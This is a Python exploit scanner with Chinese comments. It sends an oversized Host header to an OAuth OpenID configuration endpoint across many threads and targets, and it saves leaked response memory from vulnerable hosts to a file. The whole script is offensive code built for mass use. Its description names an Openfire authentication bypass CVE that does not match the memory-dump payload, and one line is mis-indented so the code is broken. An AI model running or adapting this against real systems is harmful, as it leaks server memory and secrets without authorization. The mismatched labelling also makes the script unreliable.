# 作者: VulnExpo
# 日期: 2023-10-27

import requests
import argparse
import threading
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def check_for_vulnerability(url, proxies=None, success_file=None):
	headers = {
		"Host": "a"*24576
	}
	try:
		response = requests.get(url + "/oauth/idp/.well-known/openid-configuration", headers=headers, proxies=proxies, verify=False, timeout=10)
		print(url + "/oauth/idp/.well-known/openid-configuration")
		print(response)
		if response.status_code == 200:
			with open(success_file, 'a') as s_file:
				s_file.write(f"++++++++++++++++++\n")
				s_file.write(f"目标URL: {url}\n")
				s_file.write(f"Payload: Dumped Memory\n")
				s_file.write(f"响应内容:\n{response.text[131050:]}\n\n")
			return True
	except Exception as e:
		print(f"发生异常：{e}")
	        return False

def scan_targets(targets, proxies=None, success_file=None):
	for target in targets:
		target = target.strip()
		check_for_vulnerability(target, proxies, success_file)

def multi_threaded_scan(urls, proxies=None, success_file=None, num_threads=4):
	threads = []

	for i in range(num_threads):
		thread = threading.Thread(target=scan_targets, args=(urls[i::num_threads], proxies, success_file))
		threads.append(thread)

	for thread in threads:
		thread.start()

	for thread in threads:
		thread.join()

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description="Openfire 身份认证绕过CVE-2023-32315")
	parser.add_argument("-u", "--url", help="目标URL")
	parser.add_argument("-f", "--file", default="url.txt", help="目标URL列表，默认为url.txt")
	parser.add_argument("-t", "--threads", type=int, default=4, help="线程数，默认为4")
	parser.add_argument("-p", "--proxy", help="代理服务器地址（例如：http://localhost:8080）")
	args = parser.parse_args()

	if not args.url and not args.file:
		print("请使用 -u 指定要扫描的目标URL或使用默认文件 url.txt。")
		exit(1)

	if args.url:
		urls = [args.url]
	elif args.file:
		with open(args.file, 'r') as file:
			urls = file.readlines()

	success_file = 'success_targets.txt'

	proxies = {
		"http": args.proxy,
		"https": args.proxy
	} if args.proxy else None

	multi_threaded_scan(urls, proxies, success_file, args.threads)

	print("扫描完成，成功的目标已保存到 success_targets.txt 文件中。")
